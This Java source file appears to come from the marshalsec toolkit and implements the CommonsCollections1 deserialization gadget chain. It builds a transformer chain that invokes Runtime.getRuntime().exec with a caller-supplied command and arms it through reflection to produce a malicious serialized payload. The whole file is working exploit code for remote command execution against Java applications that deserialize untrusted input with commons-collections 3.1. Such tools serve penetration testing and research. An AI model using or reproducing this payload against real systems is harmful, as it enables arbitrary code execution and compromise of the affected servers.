package marshalsec.gadgets;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
import marshalsec.UtilFactory;
import marshalsec.util.Gadgets;
import marshalsec.util.JavaVersion;
import marshalsec.util.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */

/**
 * commons-collections:commons-collections:3.1
 */
public interface CommonsCollections1 extends Gadget {

  default InvocationHandler makeCommonsCollections1(UtilFactory uf, String[] args)
      throws Exception {
    final String[] execArgs = new String[]{args[0]};
    // inert chain for setup
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{new ConstantTransformer(1)});
    // real chain for after setup
    final Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{
            String.class, Class[].class}, new Object[]{
            "getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{
            Object.class, Object[].class}, new Object[]{
            null, new Object[0]}),
        new InvokerTransformer("exec",
            new Class[]{String.class}, execArgs),
        new ConstantTransformer(1)};

    final Map innerMap = new HashMap();

    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

    Reflections.setFieldValue(transformerChain, "iTransformers",
        transformers); // arm with actual transformer chain

    return handler;
  }

  public static boolean isApplicableJavaVersion() {
    return JavaVersion.isAnnInvHUniversalMethodImpl();
  }
}
